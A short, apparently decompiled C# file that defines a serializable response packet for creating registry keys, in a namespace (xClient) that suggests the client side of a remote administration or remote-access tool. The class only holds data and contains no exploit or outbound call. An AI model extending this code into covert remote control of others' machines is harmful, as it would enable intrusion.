using System;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetCreateRegistryKeyResponse : GInterface4
{
	public string ParentPath { get; set; }

	public RegSeekerMatch Match { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
